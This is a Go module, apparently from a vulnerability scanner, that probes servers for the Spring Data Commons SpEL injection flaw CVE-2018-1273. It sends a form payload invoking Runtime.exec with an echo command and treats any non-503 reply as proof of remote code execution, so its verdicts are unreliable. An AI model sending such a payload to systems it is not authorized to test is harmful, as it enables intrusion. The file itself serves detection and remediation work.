package cve

// CVE-2018-1273: Spring Data Commons RCE via SpEL injection in property path
// Affects Spring Data Commons < 1.13.11 / < 2.0.6
// Attack: SpEL expression injected in URL parameter key: username[SpEL]=value

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&SpringDataRCE{}) }

type SpringDataRCE struct{}

func (m *SpringDataRCE) ID() string          { return "CVE-2018-1273" }
func (m *SpringDataRCE) Name() string        { return "Spring Data Commons SpEL RCE" }
func (m *SpringDataRCE) CVSS() float64       { return 9.8 }
func (m *SpringDataRCE) Severity() models.Severity { return models.SeverityCritical }
func (m *SpringDataRCE) Tags() []string      { return []string{"rce", "spring-data", "spel", "form"} }
func (m *SpringDataRCE) Requirements() vulns.ModuleRequirements { return vulns.ModuleRequirements{} }
func (m *SpringDataRCE) Description() string {
	return "Spring Data Commons evaluates property path expressions as SpEL, allowing RCE via form parameter names."
}

func (m *SpringDataRCE) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	endpoint := utils.JoinURL(target.BaseURL, "users")
	resp, err := client.Get(ctx, endpoint+"?page=0&size=5", nil)
	if err != nil || resp.StatusCode != 200 {
		return nil, nil
	}
	if !strings.Contains(resp.BodyString, "Users") && !strings.Contains(resp.BodyString, "users") {
		return nil, nil
	}

	// Endpoint confirmed — attempt SpEL probe
	payload := `username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("echo+SpringHawk")]=x&password=x&repeatedPassword=x`
	resp2, err := client.Post(ctx, endpoint, "application/x-www-form-urlencoded",
		strings.NewReader(payload), nil)
	if err != nil {
		return nil, nil
	}
	// Vulnerable if not 503 (service available, expression evaluated even if error returned)
	if resp2.StatusCode == 503 {
		return nil, nil
	}

	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2018-1273"},
		Title:       "Spring Data Commons: SpEL Injection RCE via Form Parameters",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/users",
		Method:      "POST",
		Evidence:    fmt.Sprintf("/users endpoint confirmed, SpEL payload accepted (HTTP %d) — blind RCE.", resp2.StatusCode),
		Remediation: "Upgrade Spring Data Commons to 1.13.11+ or 2.0.6+. Validate and reject bracket notation in parameter names.",
		References:  []string{"https://pivotal.io/security/cve-2018-1273", "https://nvd.nist.gov/vuln/detail/CVE-2018-1273"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
	}
	return []*models.Finding{f}, nil
}

func (m *SpringDataRCE) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
